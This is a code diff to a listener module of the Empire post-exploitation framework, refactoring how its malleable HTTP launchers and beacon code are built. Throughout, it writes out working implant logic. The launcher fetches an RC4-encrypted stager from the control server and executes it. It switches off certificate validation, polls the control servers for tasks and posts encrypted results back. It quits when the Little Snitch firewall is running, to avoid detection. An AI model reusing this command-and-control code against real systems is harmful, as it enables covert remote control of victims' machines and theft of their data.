@@ -20,7 +20,7 @@ from pydispatch import dispatcher
 from empire.server.common import encryption, helpers, malleable, packets, templating
 from empire.server.database import models
 from empire.server.database.base import Session
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 
 
 class Listener(object):
@@ -111,6 +111,11 @@ class Listener(object):
                 "Required": False,
                 "Value": "",
             },
+            "Cookie": {
+                "Description": "Custom Cookie Name",
+                "Required": False,
+                "Value": "",
+            },
         }
 
         # required:
@@ -161,7 +166,15 @@ class Listener(object):
             profile.stager.client.verb = "GET"
             profile.stager.client.metadata.transforms = []
             profile.stager.client.metadata.base64url()
-            profile.stager.client.metadata.prepend(self.generate_cookie() + "=")
+
+            # check if cookie is set for stager, else generate random cookie
+            if self.options["Cookie"]["Value"] == "":
+                profile.stager.client.metadata.prepend("session=")
+            else:
+                profile.stager.client.metadata.prepend(
+                    self.options["Cookie"]["Value"] + "="
+                )
+
             profile.stager.client.metadata.header("Cookie")
             profile.stager.server.output.transforms = []
             profile.stager.server.output.print_()
@@ -287,9 +300,6 @@ class Listener(object):
 
             if language.lower().startswith("po"):
                 # PowerShell
-                vWc = helpers.generate_random_script_var_name("wc")
-                vData = helpers.generate_random_script_var_name("data")
-
                 launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
                 if safeChecks.lower() == "true":
@@ -305,11 +315,11 @@ class Listener(object):
 
                 # ==== DEFINE BYTE ARRAY CONVERSION ====
                 launcherBase += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
                 )
 
                 # ==== DEFINE RC4 ====
-                launcherBase += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                launcherBase += listener_util.powershell_rc4()
 
                 # ==== BUILD AND STORE METADATA ====
                 routingPacket = packets.build_routing_packet(
@@ -388,7 +398,7 @@ class Listener(object):
                     if header.lower() == "host":
                         launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
 
-                    launcherBase += f'$wc.Headers.Add("{ header }"," { value }");'
+                    launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
 
                 # ==== SEND REQUEST ====
                 if (
@@ -456,15 +466,7 @@ class Listener(object):
 
                 # ==== SAFE CHECKS ====
                 if safeChecks and safeChecks.lower() == "true":
-                    launcherBase += "import re,subprocess\n"
-                    launcherBase += (
-                        'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
-                    )
-                    launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                    launcherBase += "out, err = ps.communicate()\n"
-                    launcherBase += (
-                        "if re.search('Little Snitch', out.decode()):sys.exit()\n"
-                    )
+                    launcherBase += listener_util.python_safe_checks()
 
                 launcherBase += "server='%s'\n" % (host)
 
@@ -556,26 +558,9 @@ class Listener(object):
                     launcherBase += "a=''\n"
                 launcherBase += profile.stager.server.output.generate_python_r("a")
 
-                # ==== EXTRACT IV AND STAGER ====
+                # download the stager and extract the IV
                 launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
-
-                # ==== DECRYPT STAGER (RC4) ====
-                launcherBase += "S,j,out=list(range(256)),0,[]\n"
-                launcherBase += "for i in list(range(256)):\n"
-                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-
-                # ==== EXECUTE STAGER ====
-                launcherBase += "exec(''.join(out))"
+                launcherBase += listener_util.python_extract_stager(stagingKey)
 
                 if encode:
                     launchEncoded = base64.b64encode(
@@ -667,7 +652,7 @@ class Listener(object):
                     ]
                 )
                 stager = stager.replace(
-                    '$customHeaders = "";', '$customHeaders = "' + headers + '";'
+                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                 )
 
             # patch in working hours
@@ -815,7 +800,7 @@ class Listener(object):
             code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
             code = code.replace(
                 '$DefaultResponse = ""',
-                '$DefaultResponse = "' + b64DefaultResponse + '"',
+                f'$DefaultResponse = "{ b64DefaultResponse }"',
             )
 
             # patch in the killDate and workingHours if they're specified
@@ -850,24 +835,24 @@ class Listener(object):
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay = 60", "delay = %s" % (delay))
-            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
+            code = code.replace("delay = 60", f"delay = { delay }")
+            code = code.replace("jitter = 0.0", f"jitter = { jitter }")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                'profile = "%s"' % (profileStr),
+                f'profile = "{ profileStr }"',
             )
-            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
+            code = code.replace("lostLimit = 60", f"lostLimit = { lostLimit }")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse),
+                f'defaultResponse = base64.b64decode("{ b64DefaultResponse }")',
             )
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+                code = code.replace('killDate = ""', f'killDate = "{ killDate }"')
             if workingHours != "":
                 code = code.replace(
-                    'workingHours = ""', 'workingHours = "%s"' % (workingHours)
+                    'workingHours = ""', f'workingHours = "{ workingHours }"'
                 )
 
             return code
@@ -900,44 +885,31 @@ class Listener(object):
         if language:
             if language.lower() == "powershell":
                 # PowerShell
-
-                vWc = helpers.generate_random_script_var_name("wc")
-
-                updateServers = '$Script:ControlServers = @("%s");' % (host)
+                updateServers = f'$Script:ControlServers = @("{ host }");'
                 updateServers += "$Script:ServerIndex = 0;"
 
                 # ==== HANDLE SSL ====
                 if host.startswith("https"):
                     updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                # ==== DEFINE GET ====
-                getTask = "$script:GetTask = {"
-                getTask += "try {"
-                getTask += "if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {"
-
-                # ==== BUILD ROUTING PACKET ====
-                # meta 'TASKING_REQUEST' : 4
-                getTask += "$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;"
-                getTask += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
-                getTask += profile.get.client.metadata.generate_powershell(
-                    "$RoutingPacket"
-                )
-
-                # ==== BUILD REQUEST ====
-                getTask += "$" + vWc + " = New-Object System.Net.WebClient;"
-
-                # ==== CONFIGURE PROXY ====
-                getTask += (
-                    "$" + vWc + ".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();"
-                )
-                getTask += (
-                    "$"
-                    + vWc
-                    + ".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;"
-                )
-                getTask += "if ($Script:Proxy) {"
-                getTask += "$" + vWc + ".Proxy = $Script:Proxy;"
-                getTask += "}"
+                getTask = f"""
+# ==== DEFINE GET ====
+$script:GetTask = {{
+    try {{
+        if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
+            # ==== BUILD ROUTING PACKET ====
+            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
+            $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
+            { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
+            
+            # ==== BUILD REQUEST ====
+            $vWc = New-Object System.Net.WebClient;
+            $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if ($Script:Proxy) {{
+                $vWc.Proxy = $Script:Proxy;
+            }}
+"""
 
                 # ==== CHOOSE URI ====
                 getTask += (
@@ -960,18 +932,14 @@ class Listener(object):
                 for parameter, value in profile.get.client.parameters.items():
                     getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
-                    getTask += "$taskURI += '" + parameter + "=" + value + "';"
+                    getTask += f"$taskURI += '{ parameter }={ value }';"
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
-                    getTask += (
-                        "$taskURI += '"
-                        + profile.get.client.metadata.terminator.arg
-                        + "=' + $RoutingPacket;"
-                    )
+                    getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.name }=' + $RoutingPacket;"
 
                 if (
                     profile.get.client.metadata.terminator.type
@@ -981,20 +949,12 @@ class Listener(object):
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.get.client.headers.items():
-                    getTask += (
-                        "$" + vWc + ".Headers.Add('" + header + "', '" + value + "');"
-                    )
+                    getTask += f"$vWc.Headers.Add('{ header }', '{ value }');"
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.HEADER
                 ):
-                    getTask += (
-                        "$"
-                        + vWc
-                        + ".Headers.Add('"
-                        + profile.get.client.metadata.terminator.arg
-                        + "', $RoutingPacket);"
-                    )
+                    getTask += f"$vWc.Headers.Add('{ profile.get.client.metadata.terminator.arg }', $RoutingPacket);"
 
                 # ==== ADD BODY ====
                 if (
@@ -1003,7 +963,7 @@ class Listener(object):
                 ):
                     getTask += "$body = $RoutingPacket;"
                 else:
-                    getTask += "$body = '" + profile.get.client.body + "';"
+                    getTask += f"$body = '{ profile.get.client.body }';"
 
                 # ==== SEND REQUEST ====
                 if (
@@ -1012,34 +972,16 @@ class Listener(object):
                     or profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    getTask += (
-                        "$result = $"
-                        + vWc
-                        + ".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"
-                        + profile.get.client.verb
-                        + "', [System.Text.Encoding]::Default.GetBytes('"
-                        + profile.get.client.body
-                        + "'));"
-                    )
+                    getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.get.client.verb }', [System.Text.Encoding]::Default.GetBytes('{ profile.get.client.body }'));"
                 else:
-                    getTask += (
-                        "$result = $"
-                        + vWc
-                        + ".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
-                    )
+                    getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
                 # ==== EXTRACT RESULTS ====
                 if (
                     profile.get.server.output.terminator.type
                     == malleable.Terminator.HEADER
                 ):
-                    getTask += (
-                        "$data = $"
-                        + vWc
-                        + ".responseHeaders.get('"
-                        + profile.get.server.output.terminator.arg
-                        + "');"
-                    )
+                    getTask += f"$data = $vWc.responseHeaders.get('{ profile.get.server.output.terminator.arg }');"
                     getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"
 
                 elif (
@@ -1051,60 +993,49 @@ class Listener(object):
                         "$data = [System.Text.Encoding]::Default.GetString($data);"
                     )
 
-                # ==== INTERPRET RESULTS ====
-                getTask += profile.get.server.output.generate_powershell_r("$data")
-                getTask += "$data = [System.Text.Encoding]::Default.GetBytes($data);"
+                getTask += f"""
+# ==== INTERPRET RESULTS ====
+{profile.get.server.output.generate_powershell_r("$data")}
 
-                # ==== RETURN RESULTS ====
-                getTask += "$data;"
-                getTask += "}"
+ # ==== RETURN RESULTS ====
+$data = [System.Text.Encoding]::Default.GetBytes($data);
+$data;
+}}
 
-                # ==== HANDLE ERROR ====
-                getTask += "} catch [Net.WebException] {"
-                getTask += "$script:MissedCheckins += 1;"
-                getTask += (
-                    "if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {"
-                )
-                getTask += "Start-Negotiate -S '$ser' -SK $SK -UA $ua;"
-                getTask += "}"
-                getTask += "}"
-                getTask += "};"
+# ==== HANDLE ERROR ====
+}} catch [Net.WebException] {{
+$script:MissedCheckins += 1;
+if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
+Start-Negotiate -S '$ser' -SK $SK -UA $ua;
+}}
+}}
+}};
+"""
 
-                # ==== DEFINE POST ====
-                sendMessage = "$script:SendMessage = {"
-                sendMessage += "param($Packets);"
-                sendMessage += "if ($Packets) {"
+                # ==== Send Message ====
+                sendMessage = f"""
+# ==== DEFINE POST ====
+$script:SendMessage = {{
+param($Packets);
+if ($Packets) {{
 
-                # note: id container not used, only output
+# ==== BUILD ROUTING PACKET ====
+$EncBytes = Encrypt-Bytes $Packets;
+$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
+$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
+{profile.post.client.output.generate_powershell("$RoutingPacket")}
 
-                # ==== BUILD ROUTING PACKET ====
-                # meta 'RESULT_POST' : 5
-                sendMessage += "$EncBytes = Encrypt-Bytes $Packets;"
-                sendMessage += (
-                    "$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;"
-                )
-                sendMessage += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
+# ==== BUILD REQUEST ====
+if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
+$vWc = New-Object System.Net.WebClient;
 
-                sendMessage += profile.post.client.output.generate_powershell(
-                    "$RoutingPacket"
-                )
-
-                # ==== BUILD REQUEST ====
-                sendMessage += "if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {"
-                sendMessage += "$" + vWc + " = New-Object System.Net.WebClient;"
-
-                # ==== CONFIGURE PROXY ====
-                sendMessage += (
-                    "$" + vWc + ".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();"
-                )
-                sendMessage += (
-                    "$"
-                    + vWc
-                    + ".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;"
-                )
-                sendMessage += "if ($Script:Proxy) {"
-                sendMessage += "$" + vWc + ".Proxy = $Script:Proxy;"
-                sendMessage += "}"
+ # ==== CONFIGURE PROXY ====
+$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+if ($Script:Proxy) {{
+$vWc.Proxy = $Script:Proxy;
+}}
+"""
 
                 # ==== CHOOSE URI ====
                 sendMessage += (
@@ -1125,20 +1056,16 @@ class Listener(object):
                 # ==== ADD PARAMETERS ====
                 first = True
                 for parameter, value in profile.post.client.parameters.items():
-                    sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
+                    sendMessage += f"$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
-                    sendMessage += "$taskURI += '" + parameter + "=" + value + "';"
+                    sendMessage += f"$taskURI += '{ parameter }={ value }';"
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.PARAMETER
                 ):
                     sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
-                    sendMessage += (
-                        "$taskURI += '"
-                        + profile.post.client.output.terminator.arg
-                        + "=' + $RoutingPacket;"
-                    )
+                    sendMessage += f"$taskURI += '{ profile.post.client.output.terminator.arg }=' + $RoutingPacket;"
 
                 if (
                     profile.post.client.output.terminator.type
@@ -1148,20 +1075,13 @@ class Listener(object):
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.post.client.headers.items():
-                    sendMessage += (
-                        "$" + vWc + ".Headers.Add('" + header + "', '" + value + "');"
-                    )
+                    sendMessage += f"$vWc.Headers.Add('{ header }', '{ value }');"
+
                 if (
                     profile.post.client.output.terminator.type
                     == malleable.Terminator.HEADER
                 ):
-                    sendMessage += (
-                        "$"
-                        + vWc
-                        + ".Headers.Add('"
-                        + profile.post.client.output.terminator.arg
-                        + "', $RoutingPacket);"
-                    )
+                    sendMessage += f"$vWc.Headers.Add('{ profile.post.client.output.terminator.arg }', $RoutingPacket);"
 
                 # ==== ADD BODY ====
                 if (
@@ -1170,7 +1090,7 @@ class Listener(object):
                 ):
                     sendMessage += "$body = $RoutingPacket;"
                 else:
-                    sendMessage += "$body = '" + profile.post.client.body + "';"
+                    sendMessage += f"$body = '{ profile.post.client.body }';"
 
                 # ==== SEND REQUEST ====
                 sendMessage += "try {"
@@ -1180,32 +1100,17 @@ class Listener(object):
                     or profile.post.client.output.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += (
-                        "$result = $"
-                        + vWc
-                        + ".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"
-                        + profile.post.client.verb.upper()
-                        + "', [System.Text.Encoding]::Default.GetBytes($body));"
-                    )
+                    sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.post.client.verb.upper() }', [System.Text.Encoding]::Default.GetBytes($body));"
                 else:
-                    sendMessage += (
-                        "$result = $"
-                        + vWc
-                        + ".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
-                    )
+                    sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
                 # ==== HANDLE ERROR ====
-                sendMessage += "} catch [System.Net.WebException] {"
-                sendMessage += (
-                    "if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {"
-                )
-                sendMessage += "Start-Negotiate -S '$ser' -SK $SK -UA $ua;"
-                sendMessage += "}"
-                sendMessage += "}"
-                sendMessage += "}"
-                sendMessage += "}"
-                sendMessage += "};"
-
+                sendMessage += """
+} catch [System.Net.WebException] {
+if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+Start-Negotiate -S '$ser' -SK $SK -UA $ua;
+}}}}};
+"""
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == "python":
@@ -1982,13 +1887,3 @@ class Listener(object):
                 )
             )
             self.threads[self.options["Name"]["Value"]].kill()
-
-    def generate_cookie(self):
-        """
-        Generate Cookie
-        """
-
-        chars = string.ascii_letters
-        cookie = helpers.random_string(random.randint(6, 16), charset=chars)
-
-        return cookie
